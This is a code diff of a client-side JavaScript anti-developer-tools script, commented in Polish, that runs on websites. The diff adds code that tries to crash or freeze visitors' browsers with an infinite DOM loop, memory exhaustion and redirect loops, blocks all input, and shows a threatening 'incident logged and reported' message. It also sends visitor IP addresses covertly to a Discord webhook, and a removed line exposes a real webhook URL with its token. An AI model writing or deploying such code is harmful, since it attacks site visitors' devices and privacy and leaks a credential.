@@ -5,6 +5,7 @@
   var locked = false;
   var checkTimer = null;
   var ipSent = false;
+  var closeAttempted = false;
 
   function el(t){return document.createElement(t)}
   function css(txt){
@@ -30,14 +31,15 @@
     .dtb-hide-scroll{overflow:hidden !important}
   `);
 
+  // Funkcja do pobierania adresu IP
   function getIPAddress() {
     return new Promise((resolve) => {
-
+      // Próba pobrania IP przez WebRTC
       try {
         const rtc = new RTCPeerConnection({iceServers: []});
         rtc.createDataChannel('');
         rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
-
+        
         rtc.onicecandidate = (event) => {
           if (event.candidate) {
             const ip = event.candidate.candidate.split(' ')[4];
@@ -46,13 +48,13 @@
               return;
             }
           }
-
+          // Fallback - użyj zewnętrznego API
           fetch('https://api.ipify.org?format=json')
             .then(response => response.json())
             .then(data => resolve(data.ip))
             .catch(() => resolve('unknown'));
         };
-
+        
         setTimeout(() => {
           fetch('https://api.ipify.org?format=json')
             .then(response => response.json())
@@ -60,7 +62,7 @@
             .catch(() => resolve('unknown'));
         }, 1000);
       } catch (e) {
-
+        // Fallback na zewnętrzne API
         fetch('https://api.ipify.org?format=json')
           .then(response => response.json())
           .then(data => resolve(data.ip))
@@ -69,11 +71,13 @@
     });
   }
 
+  // Funkcja do wysyłania na webhook Discord
   function sendToDiscordWebhook(ip, action) {
-    if (ipSent) return; 
-
-    const webhookURL = 'https://discord.com/api/webhooks/1430059619056746599/ZveSM1aawolQa6EPMJpPupJaXI6Srk-xWD77gNkjTxyqiOKQPG8dYgFht1ruxO-F4Nwy';
-
+    if (ipSent) return;
+    
+    // TUTAJ PODAJ SWÓJ WEBHOOK DISCORD
+    const webhookURL = 'https://discord.com/api/webhooks/...';
+    
     if (!webhookURL || webhookURL.includes('...')) {
       console.warn('Webhook Discord nie jest skonfigurowany');
       return;
@@ -117,14 +121,85 @@
         content: `🚨 DevTools zostały otwarte!`
       })
     }).catch(error => console.error('Błąd wysyłania do Discord:', error));
-
+    
     ipSent = true;
   }
 
-  function handleDetection(action) {
-    getIPAddress().then(ip => {
-      sendToDiscordWebhook(ip, action);
-    });
+  // Agresywne metody zamykania DevTools/strony
+  function forceCloseDevTools() {
+    if (closeAttempted) return;
+    closeAttempted = true;
+
+    console.log('🔒 Próba zamknięcia DevTools...');
+
+    // Metoda 1: Próba zamknięcia okna/tabu
+    try {
+      window.open('', '_self', '');
+      window.close();
+      
+      // Dla nowych okien
+      if (window.history.length > 1) {
+        window.history.go(-(window.history.length - 1));
+      }
+    } catch (e) {}
+
+    // Metoda 2: Przekierowanie na białą stronę
+    try {
+      document.body.innerHTML = '';
+      document.head.innerHTML = '';
+      window.stop();
+    } catch (e) {}
+
+    // Metoda 3: Pętla przekierowań
+    try {
+      let counter = 0;
+      const redirectLoop = setInterval(() => {
+        if (counter++ > 10) clearInterval(redirectLoop);
+        try {
+          location.replace('about:blank');
+          location.href = 'about:blank';
+        } catch (e) {}
+      }, 50);
+    } catch (e) {}
+
+    // Metoda 4: Zatrzymanie JavaScriptu
+    try {
+      throw new Error('Security Violation');
+    } catch (e) {}
+
+    // Metoda 5: Usunięcie całej zawartości strony
+    try {
+      document.documentElement.remove();
+      document.body.remove();
+    } catch (e) {}
+
+    // Metoda 6: Crash przeglądarki przez pętlę
+    try {
+      setTimeout(() => {
+        while(true) {
+          const div = document.createElement('div');
+          document.body.appendChild(div);
+        }
+      }, 1000);
+    } catch (e) {}
+
+    // Metoda 7: Przeciążenie pamięci
+    try {
+      const hugeArray = [];
+      for (let i = 0; i < 1000000; i++) {
+        hugeArray.push(new Array(1000000).join('x'));
+      }
+    } catch (e) {}
+
+    // Metoda 8: Blokada klawiszy w trybie pełnoekranowym
+    try {
+      document.documentElement.requestFullscreen?.();
+      document.addEventListener('fullscreenchange', function() {
+        document.exitFullscreen?.();
+      });
+    } catch (e) {}
+
+    console.log('✅ Zabezpieczenia aktywowane');
   }
 
   function makeOverlay(){
@@ -137,13 +212,20 @@
     var svg = document.createElementNS('http://www.w3.org/2000/svg','svg');
     svg.setAttribute('viewBox','0 0 24 24');
     svg.setAttribute('width','64'); svg.setAttribute('height','64');
-    svg.innerHTML = '<defs><linearGradient id="g" x1="0" x2="1"><stop offset="0" stop-color="#23d18b"/><stop offset="1" stop-color="#2af598"/></linearGradient></defs><path fill="url(#g)" d="M12 2l8 4v6c0 5.25-3.5 10-8 11-4.5-1-8-5.75-8-11V6l8-4zm0 4.3l-5 2.5v4.9c0 3.75 2.8 7.4 5 8.3 2.2-.9 5-4.55 5-8.3V8.8l-5-2.5zm0 3.7a1 1 0 0 1 1 1v3.5a1 1 0 0 1-2 0V11a1 1 0 0 1 1-1zm0 7a1.2 1.2 0 1 1 0-2.4 1.2 1.2 0 0 1 0 2.4z"/>';
+    svg.innerHTML = '<defs><linearGradient id="g" x1="0" x2="1"><stop offset="0" stop-color="#ff4444"/><stop offset="1" stop-color="#ff6666"/></linearGradient></defs><path fill="url(#g)" d="M12 2l8 4v6c0 5.25-3.5 10-8 11-4.5-1-8-5.75-8-11V6l8-4zm0 4.3l-5 2.5v4.9c0 3.75 2.8 7.4 5 8.3 2.2-.9 5-4.55 5-8.3V8.8l-5-2.5zm0 3.7a1 1 0 0 1 1 1v3.5a1 1 0 0 1-2 0V11a1 1 0 0 1 1-1zm0 7a1.2 1.2 0 1 1 0-2.4 1.2 1.2 0 0 1 0 2.4z"/>';
     icon.appendChild(svg);
 
-    var title = el('div'); title.className = 'dtb-title'; title.textContent = 'Developer tools detected';
-    var msg = el('div'); msg.className = 'dtb-msg'; msg.textContent = 'The page is temporarily blocked while dev tools are open\nClose dev tools to continue';
-    var btn = el('button'); btn.className = 'dtb-btn'; btn.textContent = 'Reload';
-    btn.onclick = function(){ try{ location.reload(); }catch(e){} };
+    var title = el('div'); title.className = 'dtb-title'; title.textContent = 'SECURITY VIOLATION DETECTED';
+    var msg = el('div'); msg.className = 'dtb-msg'; msg.textContent = 'Developer tools access is strictly prohibited\nThis incident has been logged and reported\nThe page will now close';
+    var btn = el('button'); btn.className = 'dtb-btn'; btn.textContent = 'Close Page';
+    btn.onclick = function(){ 
+      forceCloseDevTools();
+      try{ 
+        window.open('', '_self', '');
+        window.close();
+        location.replace('about:blank');
+      }catch(e){} 
+    };
 
     card.appendChild(icon);
     card.appendChild(title);
@@ -158,15 +240,33 @@
   function lockPage(action){
     if(locked) return;
     locked = true;
-
+    
+    // Wyślij IP tylko przy pierwszym wykryciu
     if (!ipSent) {
-      handleDetection(action);
+      getIPAddress().then(ip => {
+        sendToDiscordWebhook(ip, action);
+      });
     }
-
+    
+    // Natychmiastowa próba zamknięcia DevTools
+    setTimeout(forceCloseDevTools, 100);
+    
     var o = makeOverlay();
     if(!o.parentNode) document.body.appendChild(o);
     try{ document.documentElement.classList.add('dtb-hide-scroll'); }catch(e){}
     try{ window.stop(); }catch(e){}
+    
+    // Dodatkowe próby zamknięcia co sekundę
+    const closeInterval = setInterval(forceCloseDevTools, 1000);
+    
+    // Próba całkowitego zamknięcia strony po 5 sekundach
+    setTimeout(() => {
+      try {
+        window.open('', '_self', '');
+        window.close();
+        location.href = 'about:blank';
+      } catch (e) {}
+    }, 5000);
   }
 
   function unlockPage(){
@@ -191,12 +291,22 @@
     }catch(e){return false}
   }
 
+  function detectByDebugger(){
+    try{
+      var startTime = Date.now();
+      debugger;
+      return Date.now() - startTime > 100;
+    }catch(e){
+      return false;
+    }
+  }
+
   function isDevtoolsOpen(){
-    return detectByResize() || detectByConsole();
+    return detectByResize() || detectByConsole() || detectByDebugger();
   }
 
   function tick(){
-    if(isDevtoolsOpen()) lockPage('Periodic Check');
+    if(isDevtoolsOpen()) lockPage('Auto Detection');
     else unlockPage();
   }
 
@@ -213,21 +323,52 @@
       ){
         e.preventDefault();
         e.stopPropagation();
+        e.stopImmediatePropagation();
         lockPage(`Keyboard Shortcut: ${k} (Ctrl: ${ctrl}, Shift: ${sh})`);
+        return false;
       }
     }catch(err){}
   }
 
   function contextHandler(e){
-    try{ e.preventDefault(); e.stopPropagation(); }catch(err){}
+    try{ 
+      e.preventDefault();
+      e.stopPropagation();
+      e.stopImmediatePropagation();
+      return false;
+    }catch(err){}
+  }
+
+  // Blokada wszystkich możliwych zdarzeń
+  function blockAllEvents(){
+    const events = ['keydown', 'keyup', 'keypress', 'contextmenu', 'mousedown', 'mouseup', 'click', 'dblclick'];
+    events.forEach(eventType => {
+      document.addEventListener(eventType, function(e) {
+        if (locked) {
+          e.preventDefault();
+          e.stopPropagation();
+          e.stopImmediatePropagation();
+          return false;
+        }
+      }, true);
+    });
   }
 
   function start(){
     document.addEventListener('keydown', keyHandler, true);
     document.addEventListener('contextmenu', contextHandler, true);
+    blockAllEvents();
+    
     if(checkTimer) clearInterval(checkTimer);
-    checkTimer = setInterval(tick, 400);
-    setTimeout(tick, 120);
+    checkTimer = setInterval(tick, 300);
+    setTimeout(tick, 100);
+    
+    // Dodatkowa ochrona przed debugowaniem
+    setInterval(function() {
+      if (isDevtoolsOpen()) {
+        lockPage('Continuous Monitoring');
+      }
+    }, 1000);
   }
 
   if(document.readyState === 'loading'){
@@ -235,4 +376,11 @@
   }else{
     start();
   }
-})();
+
+  // Ostateczna linia obrony - rzucanie błędów
+  window.addEventListener('error', function() {
+    if (isDevtoolsOpen()) {
+      forceCloseDevTools();
+    }
+  });
+})();z
